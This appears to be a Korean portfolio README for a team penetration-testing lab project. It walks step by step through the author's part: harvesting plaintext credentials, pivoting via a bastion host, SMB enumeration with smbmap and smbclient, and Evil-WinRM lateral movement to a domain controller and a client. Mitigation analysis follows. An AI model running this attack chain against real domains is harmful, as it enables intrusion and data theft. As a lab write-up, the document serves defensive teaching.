# 작성 예정

---

## 프로젝트 개요

| 항목 | 내용 |
|------|------|
| 프로젝트명 | 작성예정 |
| 분류 | 네트워크 침투 / AD 공격 / 자동 대응 |
| 수행기간 | 2026.04 ~ 2026.05 |
| 참여인원 | 7인 팀 프로젝트 (본인 담당 파트 중심 기술) |

실제 기업 환경과 유사한 3-tier 네트워크(DMZ / Internal / Client)를 직접 구축하고,  
외부 공격자가 웹 서버 침투 이후 내부망까지 장악하는 전체 침투 흐름을 설계·실습한 프로젝트입니다.  
공격 탐지 및 자동 차단까지 구현하여 공격과 방어 양쪽을 모두 다뤘습니다.

---

## 전체 인프라 구성

```
인터넷 (단일 공인 IP)
        ↓
OPNsense (경계 방화벽 / NAT / 포트포워딩 80, 443)
        ↓
┌─────────────────────────────────────────────────────────┐
│  DMZ 영역 (192.168.11.0/24)                              │
│  - Apache/Nginx        웹서버, Reverse Proxy, SSSD 연동  │
│  - OAuth 서버(Keycloak) JWT, Algorithm Confusion, BOLA  │
│  - Rocky Linux 8.10    Bastion / Pivot / SMB 내부망 정찰 │
└─────────────────────────────────────────────────────────┘
        ↓ (389 / 88 / 3306)
┌─────────────────────────────────────────────────────────┐
│  Internal 영역 (192.168.12.0/24)                         │
│  - FreeIPA             LDAP, Kerberos, DNS, SSO          │
│  - MySQL               DB / Port 3306                    │
│  - Windows Server 2022 AD DS, DNS, DC (192.168.12.10)   │
│  - Docker 인트라넷      Wiki.js, Nextcloud, Mattermost   │
│  - ELK Stack (SIEM)    Elasticsearch, Logstash, Kibana  │
└─────────────────────────────────────────────────────────┘
        ↓ (Kerberos / AD Trust)
┌─────────────────────────────────────────────────────────┐
│  Client 영역 (192.168.13.0/24)                           │
│  - Windows 10/11       사용자 PC, 도메인 조인             │
│  - Cisco CSR1000V      SOAR 연동, ACL 자동 업데이트       │
└─────────────────────────────────────────────────────────┘

SOAR 자동 대응: Rsyslog → ELK 상관분석 → Python(Netmiko) → Cisco ACL 차단 → Kibana 시각화
```

---

## 사용 기술 및 환경

| 구성 요소 | 버전 / 내용 |
|-----------|------------|
| 하이퍼바이저 | Proxmox VE (Intel i5-12400, RAM 32GB, SSD 475GB) |
| OS | Rocky Linux 8.10 |
| 방화벽 | OPNsense (화이트리스트 정책, 단일 공인 IP NAT) |
| AD / 디렉터리 | Windows Server 2022 (AD DS, DNS, DC), FreeIPA |
| 인증 | Keycloak (OAuth2, JWT), Kerberos, LDAP, SSO |
| SIEM | ELK Stack (Elasticsearch, Logstash, Kibana) |
| SOAR | Python(Netmiko) |
| 공격 도구 | Nmap, smbmap, smbclient, Evil-WinRM |
| 기타 | Docker, MySQL, Rsyslog |

---

## 전체 공격 시나리오 흐름

> 팀 전체가 함께 설계한 침투 흐름입니다. 본인 담당 파트는 **3단계(SMB 내부망 정찰 및 횡적 이동)**입니다.

```
[1단계] OAuth 리다이렉트 URL 검증 미흡
        → 피싱 링크로 사용자 토큰 탈취
        → 관리자 계정 탈취 후 로그인 성공
                ↓
[2단계] JWT 알고리즘 혼동(Algorithm Confusion) 공격
        → RSA 공개키로 HS256 위조 토큰 생성
        → WebShell 업로드 (.php5 블랙리스트 우회)
        → 리버스쉘 획득
        → Path Traversal → 크론잡 백도어 삽입
        → 웹 서버 root 권한 장악
                ↓
[3단계] SMB 내부망 정찰 및 횡적 이동 ← 본인 담당
        → 웹 서버에서 Windows 로컬 계정 정보 획득
        → Bastion 경유 Windows Server SMB 정찰
        → 관리자 계정 획득 → Evil-WinRM 접속
        → 도메인 계정 확인 → 클라이언트까지 횡적 이동
        → 내부 시스템 전체 장악
```

---

## 본인 담당 역할 — SMB 내부망 정찰 및 횡적 이동

### 공격 흐름 한 줄 요약
> **"웹 서버에 남겨진 단서 하나가 AD 도메인 전체 장악으로 이어졌다"**

```
웹 서버(root) → setup.sh에서 로컬 계정 발견
        ↓
Bastion으로 SSH 피벗 (192.168.11.55)
        ↓
nmap → Windows Server 445/tcp open 확인
        ↓
smbmap / smbclient → 공유 폴더 탐색 → server_info.txt 획득
        ↓
Administrator 계정 확보 → smbmap ADMIN!!! 확인
        ↓
Evil-WinRM → Windows Server 접속 → 도메인 계정 확인
        ↓
nmap → Client 445/tcp open 확인
        ↓
Evil-WinRM → Client 접속 → 도메인 사용자 세션 확인
        ↓
domainuser로 Client SMB 접근 → 내부 자료 열람 성공
```

---

### 1단계 — 웹 서버에서 Windows 로컬 계정 정보 수집

웹 서버 root 권한을 획득한 상태에서 `/root/setup.sh` 파일을 열어봤더니,  
Windows 서버를 SMB로 마운트하는 스크립트 안에 **로컬 계정 정보가 평문으로 그대로 적혀 있었습니다.**

```bash
[root@web ~]# cat setup.sh
# Windows 서버 마운트
mount -t cifs //192.168.12.10/Company /mnt/company \
  -o username=localuser,password=Qwer@1234
```

> 획득 정보: `localuser / Qwer@1234` (Windows Server 192.168.12.10 로컬 계정)

![웹서버 setup.sh 계정 확인](img/web_setupsh.png)

---

### 2단계 — Bastion 서버로 SSH 피벗

DMZ 내 Bastion 서버(192.168.11.55)로 이동하여 내부망 정찰의 거점을 확보했습니다.  
Bastion은 DMZ와 Internal 영역 모두에 접근 가능한 **Pivot 포인트**로 활용했습니다.

```bash
[root@web ~]# ssh root@192.168.11.55
Password: qw12
[root@bastion ~]#
```

![Bastion SSH 접속](img/bastion_ssh.png)

---

### 3단계 — Nmap으로 445 포트 확인

Bastion에서 Windows Server(192.168.12.10)를 대상으로 포트 스캔을 실행하여  
**SMB 서비스(445/tcp)가 열려 있음**을 확인했습니다.

```bash
[root@bastion ~]# nmap 192.168.12.10
PORT    STATE  SERVICE
445/tcp open   microsoft-ds
```

> 80, 443은 닫혀 있었고 445만 열려 있는 것을 확인 — SMB 공격 진입점 확보

![nmap Windows Server 포트 스캔](img/nmap_winserver.png)

---

### 4단계 — smbmap으로 공유 폴더 및 권한 열거

획득한 로컬 계정(`localuser`)으로 Windows Server에 SMB 접속하여 공유 폴더 구조와 접근 권한을 확인했습니다.

```bash
[root@bastion ~]# smbmap -H 192.168.12.10 -u localuser -p 'Qwer@1234'
```

| 공유 폴더 | 권한 | 비고 |
|-----------|------|------|
| ADMIN$ | NO ACCESS | Remote Admin |
| C$ | NO ACCESS | Default share |
| Company | READ ONLY | 부서별 폴더 존재 |
| NETLOGON | READ ONLY | Logon server share |
| SYSVOL | READ ONLY | Logon server share |

![smbmap 공유 폴더 열거](img/smbmap_localuser.png)

이어서 `Company` 폴더 내부를 확인하니 **Dev / HR / IT** 3개 부서 폴더가 존재했습니다.

```bash
smbmap -H 192.168.12.10 -u localuser -p 'Qwer@1234' -r Company
```

![smbmap Company 폴더 탐색](img/smbmap_company.png)

---

### 5단계 — smbclient로 민감 파일 탈취

`smbclient`로 직접 접속하여 각 부서 폴더를 탐색하고 민감 파일을 다운로드했습니다.

```bash
[root@bastion ~]# smbclient //192.168.12.10/Company -U localuser%'Qwer@1234'
```

| 폴더 | 발견 파일 | 내용 |
|------|-----------|------|
| Dev | `.env` | 환경변수 파일 |
| HR | `employee_accounts.csv` | 직원 계정 목록 |
| IT | `server_info.txt` | **서버 관리자 계정 정보** |
| IT | `config.ini` | 서버 설정 파일 |

```bash
smb: \IT\> get server_info.txt
```

다운로드한 `server_info.txt`를 열어보니 **관리자 계정이 평문으로 기록**되어 있었습니다.

```
[Server Admin Account]
Windows Server Admin
  - ID : Administrator
  - PW : qw@12

DB Server
  - ID : sa
  - PW : Qwer@1234

[Local Account]
localuser / Qwer@1234
```

![smbclient 파일 탐색 및 다운로드](img/smbclient_download.png)
![server_info.txt 내용 확인](img/server_info.png)

---

### 6단계 — Administrator 권한으로 SMB 재접속

획득한 Administrator 계정으로 smbmap을 재실행하니 **Status: ADMIN!!!** 으로 전체 공유 폴더에 READ/WRITE 권한이 부여됐습니다.

```bash
[root@bastion ~]# smbmap -H 192.168.12.10 -u Administrator -p 'qw@12'
```

| 공유 폴더 | 권한 |
|-----------|------|
| ADMIN$ | READ, WRITE |
| C$ | READ, WRITE |
| Company | READ, WRITE |
| NETLOGON | READ, WRITE |
| SYSVOL | READ, WRITE |

> Windows Server 전체 파일 시스템 접근 권한 확보

![smbmap Administrator ADMIN!!! 확인](img/smbmap_admin.png)

---

### 7단계 — Evil-WinRM으로 Windows Server 원격 접속 및 도메인 계정 확인

Evil-WinRM을 이용해 WinRM(5985)으로 Windows Server에 원격 PowerShell 접속을 성공했습니다.

```bash
[root@bastion ~]# evil-winrm -i 192.168.12.10 -u Administrator -p 'qw@12'
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

접속 후 `net user domainuser /domain` 명령으로 도메인 계정 정보를 확인했습니다.  
`domainuser` 계정이 **Domain Users** 그룹에 속해 있어 **도메인 내 모든 시스템 접근이 가능한 상태**임을 확인했습니다.

```powershell
*Evil-WinRM* PS> net user domainuser /domain
Global Group memberships: *Domain Users
```

![Evil-WinRM Windows Server 접속](img/evilwinrm_winserver.png)
![도메인 계정 정보 확인](img/domain_user_info.png)

---

### 8단계 — 클라이언트로 횡적 이동 (Lateral Movement)

Bastion에서 클라이언트(192.168.13.10)도 **445/tcp가 열려 있음**을 확인하고,  
동일한 Administrator 계정으로 Evil-WinRM 접속에 성공했습니다.

```bash
[root@bastion ~]# nmap 192.168.13.10
PORT    STATE  SERVICE
445/tcp open   microsoft-ds

[root@bastion ~]# evil-winrm -i 192.168.13.10 -u Administrator -p 'qw@12'
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

`query user` 명령으로 현재 로그온 중인 사용자를 확인하니 **domainuser가 세션을 유지 중**이었습니다.

```powershell
*Evil-WinRM* PS C:\> query user
 사용자 이름    세션 이름    ID  상태    로그온 시간
 user          console       1   활성    2026-05-18 오전 9:22
 domainuser                  2   디스크  2026-05-18 오후 12:37
```

![nmap Client 포트 스캔](img/nmap_client.png)
![Evil-WinRM Client 접속](img/evilwinrm_client.png)
![query user 세션 확인](img/query_user.png)

---

### 9단계 — domainuser로 내부 자료 접근

도메인 계정(`domainuser`)으로 클라이언트 SMB 공유 폴더에 접근하여 **READ/WRITE 권한**을 확인했습니다.

```bash
[root@bastion ~]# smbmap -H 192.168.13.10 -u domainuser -p 'Qwer@1234' -d KH
# Shared 폴더: READ, WRITE

[root@bastion ~]# smbclient //192.168.13.10/Shared -U KH/domainuser%'Qwer@1234'
smb: \> ls
  IT          (디렉터리)
  공지사항    (디렉터리)
  업무자료    (디렉터리)
```

> 내부 업무 자료, 공지사항, IT 폴더까지 열람 가능한 상태 — **도메인 내 내부 시스템 전체 장악 완료**

![smbmap domainuser Client 접근](img/smbmap_domainuser.png)
![smbclient Shared 폴더 열람](img/smbclient_shared.png)

---

## 취약점 분석 및 대응 방안

### 민감 정보 평문 저장 (setup.sh / server_info.txt)

웹 서버의 `setup.sh`에 Windows 로컬 계정 정보가 평문으로 저장되어 있었고,  
SMB 공유 폴더의 `server_info.txt`에는 Administrator 비밀번호까지 평문으로 기록되어 있었습니다.  
웹 서버 root 권한 하나만 획득해도 즉시 내부망 계정 정보 전체가 노출되는 구조였습니다.

**대응 방안:**
- 스크립트 내 자격 증명은 환경변수 또는 Vault(HashiCorp Vault, AWS Secrets Manager 등)로 분리
- 민감 정보가 포함된 파일은 SMB 공유 폴더에 보관하지 않도록 정책 수립
- 공유 폴더 접근 권한을 업무 필요 최소한으로 제한 (최소 권한 원칙)

```bash
# ❌ 취약한 방식
mount -t cifs //192.168.12.10/Company /mnt/company \
  -o username=localuser,password=Qwer@1234

# ✅ 대응 방식 — 환경변수 분리
mount -t cifs //192.168.12.10/Company /mnt/company \
  -o username=${SMB_USER},password=${SMB_PASS}
```

---

### SMB 공유 폴더 과도한 접근 권한

일반 로컬 계정(`localuser`)으로 Company 공유 폴더 전체를 열람할 수 있었고,  
IT 폴더에서 관리자 계정 정보 파일까지 다운로드가 가능했습니다.

**대응 방안:**
- 부서별 폴더에 ACL 적용하여 해당 부서 계정만 접근 허용
- 민감 파일(server_info.txt, .env 등)은 공유 폴더 외부에 보관
- SMB 접근 로그 수집 및 비정상 접근 탐지 규칙 설정

---

### WinRM 과도한 허용 (방화벽 규칙)

OPNsense 방화벽 규칙에서 Bastion(192.168.11.55)에서 Windows Server / Client 양쪽 모두의  
WinRM(5985, 9200) 포트가 허용되어 있었습니다.  
Bastion을 장악하면 즉시 내부망 전체에 Evil-WinRM 접속이 가능한 상태였습니다.

**대응 방안:**
- WinRM 접근을 허용할 소스 IP를 최소한으로 제한
- 도메인 관리자 계정의 원격 로그인 범위를 특정 관리 서버로만 제한
- WinRM 접속 시 MFA(다중 인증) 적용 검토

---

### 동일 관리자 계정 재사용 (Credential Reuse)

Windows Server의 Administrator 계정(`qw@12`)이 클라이언트(192.168.13.10)에서도 동일하게 사용되고 있었습니다.  
계정 하나만 획득하면 도메인 내 모든 시스템에 동일하게 접속이 가능한 구조였습니다.

**대응 방안:**
- 시스템별 로컬 관리자 계정 비밀번호를 LAPS(Local Administrator Password Solution)로 개별 관리
- 도메인 관리자 계정과 로컬 관리자 계정을 분리 운영
- 관리자 계정 사용 시 접근 로그 수집 및 이상 징후 알림 설정

---

## 프로젝트 참여 소감

처음에는 SMB 공격이 단순히 파일 공유를 열어보는 수준일 거라고 생각했는데,  
직접 실습하면서 **웹 서버에 남겨진 스크립트 파일 하나가 도메인 전체 장악으로 이어지는 흐름**을 직접 눈으로 확인하고 나니 생각이 많이 달라졌습니다.

특히 공격 기술 자체보다 **"왜 이게 가능했는가"** 를 분석하는 과정이 더 중요하다고 느꼈습니다.  
관리자가 편의를 위해 스크립트에 계정을 적어둔 것, 공유 폴더 권한을 넉넉하게 설정해둔 것,  
여러 서버에 같은 비밀번호를 사용한 것 — 각각은 작은 문제처럼 보이지만 연결되면 도메인 전체가 열리는 공격 경로가 됩니다.

이 경험 이후로 시스템을 볼 때 "이 계정은 어디까지 접근이 가능한가",  
"이 파일이 노출되면 어떤 정보가 나오는가"를 먼저 생각하는 습관이 생겼습니다.

---

> ⚠️ 이 저장소의 코드 및 공격 시나리오는 **교육 및 실습 목적**으로만 작성되었습니다.  
> 실제 운영 환경이나 허가받지 않은 시스템에 사용하는 것은 법적으로 금지되어 있습니다.
